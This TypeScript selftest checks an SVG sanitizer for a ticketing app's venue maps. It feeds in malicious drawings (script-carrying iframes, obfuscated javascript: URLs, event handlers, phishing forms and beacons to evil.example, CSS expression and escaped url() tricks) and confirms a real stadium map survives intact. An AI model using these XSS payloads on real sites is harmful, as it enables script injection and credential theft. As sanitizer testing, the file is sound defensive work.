/**
 * `sanitizeAndPrepareSvg` (lib/tixstock-map.ts) selftest - the supplier drawing's sanitizer, the one place a venue SVG
 * is cleaned before `dangerouslySetInnerHTML` (the classify dialog's map, components/venue-section-map.tsx, and the
 * portal's map, components/TixstockDynamicMap.tsx). One malicious drawing per vector of the 2026-10-28 security review
 * (Alon round 2, Task 10): each must come out without it. Then a real map (public/Arsenal-Emirates Stadium.svg) must
 * keep its sections, shapes and fills.
 *
 * The module calls the browser's `DOMParser`; here linkedom's stands in (a global shim, set before any call). linkedom
 * does not track XML namespaces (every element reads as XHTML), so the namespace half of the rule is a browser
 * matter - a prefixed foreign element (`h:div`) is still refused here by its name.
 *
 * Run: npx tsx scripts/tixstock-map-selftest.ts
 */
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { DOMParser } from "linkedom";
import { cleanSvgCss, sanitizeAndPrepareSvg } from "@/lib/tixstock-map";

Object.assign(globalThis, { DOMParser });

let checks = 0;
const check = (cond: unknown, msg: string): void => {
  assert.ok(cond, msg);
  checks++;
};
const same = (actual: unknown, expected: unknown, msg: string): void => {
  assert.deepEqual(actual, expected, msg);
  checks++;
};

const SVG_OPEN = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:h="http://www.w3.org/1999/xhtml" viewBox="0 0 100 100">';
const wrap = (inner: string): string => `${SVG_OPEN}<g data-section="lower-tier_101" data-category="lower-tier"><path class="block" d="M0 0L10 10"/></g>${inner}</svg>`;

/** The sanitized drawing, lower-cased (what the "is it gone" checks read), and parsed back (what the "is it kept" checks read). */
function clean(raw: string): { text: string; doc: Document } {
  const out = sanitizeAndPrepareSvg(raw);
  assert.ok(out !== null, "the drawing parses");
  checks++;
  const doc = new DOMParser().parseFromString(out, "image/svg+xml") as unknown as Document;
  return { text: out.toLowerCase(), doc };
}
const count = (doc: Document, selector: string): number => doc.querySelectorAll(selector).length;

// ---- one malicious drawing per vector --------------------------------------------------------------------------
{
  // <foreignObject><iframe srcdoc> - an HTML integration point: script in our origin once innerHTML re-parses it.
  const fo = clean(wrap('<foreignObject width="10" height="10"><h:iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"/><iframe srcdoc="x"/></foreignObject>'));
  check(!fo.text.includes("foreignobject") && !fo.text.includes("iframe") && !fo.text.includes("srcdoc") && !fo.text.includes("alert"), "foreignObject + iframe srcdoc: gone with its subtree");
  check(count(fo.doc, "[data-section]") === 1, "foreignObject vector: the map's own section stays");

  // <iframe src="javascript:">, <object data>, <embed src>, at the drawing's top level.
  const frames = clean(wrap('<iframe src="javascript:alert(1)"/><object data="https://evil.example/o"/><embed src="https://evil.example/e"/>'));
  check(!frames.text.includes("iframe") && !frames.text.includes("javascript"), "iframe src=javascript: is gone");
  check(!frames.text.includes("<object") && !frames.text.includes("<embed") && !frames.text.includes("evil.example"), "object data / embed src are gone");

  // A phishing form inside foreignObject, and form controls loose in the drawing.
  const form = clean(
    wrap('<foreignObject><h:form action="https://evil.example/login"><h:input name="password"/><h:button>Sign in</h:button></h:form></foreignObject><form><input name="card"/><button>Pay</button><textarea/><select/></form>'),
  );
  check(
    !["<form", "<input", "<button", "<textarea", "<select", "h:form", "password", "evil.example", "sign in"].some((t) => form.text.includes(t)),
    "form / input / button / textarea / select: gone (inside foreignObject and loose)",
  );

  // External fetches: <image href>, <use href> to another file, a link / meta / base, video / audio.
  const beacons = clean(
    wrap(
      '<image href="https://evil.example/i.png"/><image xlink:href="https://evil.example/j.png"/><use href="https://evil.example/x.svg#a"/>' +
        '<use xlink:href="https://evil.example/y.svg#b"/><h:link rel="stylesheet" href="https://evil.example/s.css"/><link href="https://evil.example/t.css"/>' +
        '<meta http-equiv="refresh" content="0;url=https://evil.example/r"/><base href="https://evil.example/"/><video src="https://evil.example/v"/><audio src="https://evil.example/a"/>' +
        '<symbol id="ok"><rect width="1" height="1"/></symbol><use href="#ok"/><use xlink:href="#ok"/><use/>',
    ),
  );
  check(!beacons.text.includes("evil.example"), "image / external use / link / meta / base / video / audio: no external url is left");
  check(!["<image", "<link", "<meta", "<base", "<video", "<audio"].some((t) => beacons.text.includes(t)), "image / link / meta / base / video / audio elements are gone");
  same(count(beacons.doc, "use"), 2, "use: the two #fragment ones stay; external targets and a use with no href go");
  check(count(beacons.doc, "symbol") === 1, "a symbol stays (a use may point at it)");

  // A supplier <style>: @import, external url(), behavior / -moz-binding / expression / javascript: out; url(#id) and the classes stay.
  const style = clean(
    wrap(
      "<style>@import url(https://evil.example/x.css); .s{fill:url(https://evil.example/b)} .t{fill:url(#grad)} .u{behavior:url(x.htc)} .v{-moz-binding:url(x.xml#b)} .w{width:expression(alert(1))} .st0{fill:#599D52}</style>",
    ),
  );
  check(!style.text.includes("@import") && !style.text.includes("evil.example") && !style.text.includes("x.htc") && !style.text.includes("x.xml"), "style: @import and every external url() are out");
  check(!style.text.includes("behavior") && !style.text.includes("-moz-binding") && !style.text.includes("expression("), "style: behavior / -moz-binding / expression( are out");
  check(style.text.includes("url(#grad)") && style.text.includes(".st0{fill:#599d52}"), "style: url(#id) and the class fills stay");
  const escaped = clean(wrap("<style>.x{background:u\\72l(https://evil.example/e)} .st0{fill:red}</style>"));
  check(!escaped.text.includes("evil.example") && !escaped.text.includes("u\\72l"), "style: a CSS escape that could spell url( again drops the whole supplier style");
  same(cleanSvgCss(".a{fill:url('#g')} .b{fill:url(\"#h\")}"), ".a{fill:url('#g')} .b{fill:url(\"#h\")}", "cleanSvgCss: quoted url(#id) stays as it is");
  same(cleanSvgCss(".a{fill:url(https://evil.example/p)}"), ".a{fill:none}", "cleanSvgCss: an external url() becomes none");
  same(cleanSvgCss('.a{fill:url("https://evil.example/a)b")}'), null, "cleanSvgCss: a url() it cannot read cleanly drops the style");
  same(cleanSvgCss(".a{fill:red} /* data:x */"), null, "cleanSvgCss: a data: left anywhere drops the style");

  // <script>, and on* handlers in any case.
  const script = clean(wrap('<script>alert(1)</script><h:script>alert(2)</h:script><g onclick="alert(3)" ONMOUSEOVER="alert(4)" onLoad="alert(5)" data-section="upper_1"><rect width="1" height="1" onfocus="alert(6)"/></g>'));
  check(!script.text.includes("script") && !script.text.includes("alert"), "script elements and every on* handler (any case) are gone");
  check(count(script.doc, '[data-section="upper_1"]') === 1, "the element that carried the handlers stays, without them");

  // javascript: / data: hidden by whitespace and control characters, in an href, a style and a presentation attribute; <a> unwrapped.
  const urls = clean(
    wrap(
      '<a href="java\tscript:alert(1)"><rect id="kept-in-a" width="1" height="1"/></a><a xlink:href="javascript:alert(2)"><circle r="1"/></a>' +
        '<rect id="r1" width="1" height="1" style="fill:url(java&#9;script:alert(3))"/><rect id="r2" width="1" height="1" fill="url(https://evil.example/p)"/>' +
        '<rect id="r3" width="1" height="1" style="background:url(data:image/png;base64,AAAA)"/><rect id="r4" width="1" height="1" style="width:expression(alert(4))"/>' +
        '<rect id="r5" width="1" height="1" style="-moz-binding:url(x.xml#b)"/><rect id="r6" width="1" height="1" style="behavior:url(x.htc)"/>' +
        '<rect id="r7" width="1" height="1" style="fill:u\\72l(https://evil.example/q)"/><rect id="r8" width="1" height="1" fill="url(#grad)" style="stroke:#fff"/>' +
        '<rect id="r9" width="1" height="1" src="https://evil.example/s" srcdoc="x"/>',
    ),
  );
  check(!urls.text.includes("javascript") && !urls.text.includes("script") && !urls.text.includes("alert"), "javascript: in an href / style / fill (tab and &#9; inside it) is gone");
  check(!urls.text.includes("data:") && !urls.text.includes("evil.example") && !urls.text.includes("expression(") && !urls.text.includes("moz-binding") && !urls.text.includes("behavior"), "data: / external url / expression( / -moz-binding / behavior attributes are gone");
  check(count(urls.doc, "a") === 0 && count(urls.doc, "#kept-in-a") === 1 && count(urls.doc, "circle") === 1, "a is unwrapped: the link goes, its shapes stay");
  check(count(urls.doc, "rect") === 10, "every rect stays - only the unsafe attributes left them");
  const r8 = urls.doc.querySelector("#r8");
  check(r8?.getAttribute("fill") === "url(#grad)" && r8?.getAttribute("style") === "stroke:#fff", "url(#id) and a plain style stay");
  check(!urls.text.includes(" src=") && !urls.text.includes("srcdoc"), "src and srcdoc are dropped from any element");

  // SMIL animations (set / animate can write an href) and feImage; the harmless filter primitives stay.
  const smil = clean(
    wrap(
      '<rect width="1" height="1"><set attributeName="href" to="javascript:alert(1)"/><animate attributeName="fill" to="red"/><animateMotion/><animateTransform/></rect>' +
        '<filter id="f"><feImage href="https://evil.example/f.png"/><feGaussianBlur stdDeviation="1"/><feOffset dx="1"/></filter>',
    ),
  );
  check(!["<set", "<animate", "animatemotion", "animatetransform", "feimage", "evil.example", "javascript"].some((t) => smil.text.includes(t)), "set / animate / animateMotion / animateTransform / feImage: gone");
  check(count(smil.doc, "feGaussianBlur") === 1 && count(smil.doc, "feOffset") === 1 && count(smil.doc, "filter") === 1, "a filter's harmless primitives stay");

  // An element of another namespace, an element inside title / desc (HTML integration points), comments.
  const foreign = clean(wrap('<h:div>hello</h:div><title>Emirates<h:img src="x" onerror="alert(1)"/></title><desc>Stadium<h:b>x</h:b></desc><!-- a comment -->'));
  check(!foreign.text.includes("h:div") && !foreign.text.includes("hello") && !foreign.text.includes("<h:"), "an XHTML-namespace element is gone");
  check(!foreign.text.includes("img") && !foreign.text.includes("onerror") && !foreign.text.includes("<!--"), "title / desc keep text only; comments go");
  same([foreign.doc.querySelector("title")?.textContent, foreign.doc.querySelector("desc")?.textContent], ["Emirates", "Stadium"], "title / desc text stays");

  // Not an SVG at all.
  same(sanitizeAndPrepareSvg("<html><body>x</body></html>"), null, "a file with no <svg> is no drawing");
}

// ---- a real map keeps what the maps need -----------------------------------------------------------------------
{
  const raw = readFileSync(join(process.cwd(), "public", "Arsenal-Emirates Stadium.svg"), "utf8");
  const before = new DOMParser().parseFromString(raw, "image/svg+xml") as unknown as Document;
  const after = clean(raw);
  const shapes = ["path", "rect", "polygon", "polyline", "circle", "line", "ellipse"];
  same(
    shapes.map((tag) => count(after.doc, tag)),
    shapes.map((tag) => count(before, tag)),
    "Arsenal: every shape stays (path / rect / polygon / polyline / circle / line / ellipse)",
  );
  check(count(before, "[data-section]") > 50, "Arsenal: the drawing has its sections (fixture sanity)");
  same(count(after.doc, "[data-section]"), count(before, "[data-section]"), "Arsenal: every data-section element stays");
  same(count(after.doc, "[data-category]"), count(before, "[data-category]"), "Arsenal: every data-category element stays");
  const sectionsKept = (doc: Document): number => Array.from(doc.querySelectorAll("[data-section]")).filter((el) => (el.getAttribute("data-section") ?? "").includes("_")).length;
  same(sectionsKept(after.doc), sectionsKept(before), "Arsenal: section ids keep their <category>_<section> form");
  check(count(before, ".st6") > 100 && count(before, ".st1") > 0, "Arsenal: the sections wear st6 and the field lines st1 (fixture sanity)");
  same([count(after.doc, ".st6"), count(after.doc, ".st1"), count(after.doc, ".st0")], [count(before, ".st6"), count(before, ".st1"), count(before, ".st0")], "Arsenal: the class fills stay (st6 sections, st1 field lines, st0 pitch)");
  same(count(after.doc, ".block"), count(before, ".block"), "Arsenal: every section shape (.block) keeps its class");
  const css = Array.from(after.doc.querySelectorAll("style")).map((el) => el.textContent ?? "").join("\n");
  check(css.includes(".st0") && css.includes("#599D52") && css.includes("pointer-events: none !important"), "Arsenal: the supplier style and the injected text style both stay");
  check(count(after.doc, ".tier-label") === 0, "Arsenal: the prep still removes the tier labels");
  const root = after.doc.querySelector("svg");
  same([root?.getAttribute("width"), root?.getAttribute("height"), root?.getAttribute("viewBox"), root?.getAttribute("direction")], ["100%", "100%", "0 0 1018.4 824.5", "ltr"], "Arsenal: the prep still sizes the drawing and keeps its viewBox");
  check(after.doc.querySelectorAll("[transform]").length > 0, "Arsenal: transforms stay");
}

console.log(`tixstock map selftest: all ${checks} checks passed`);
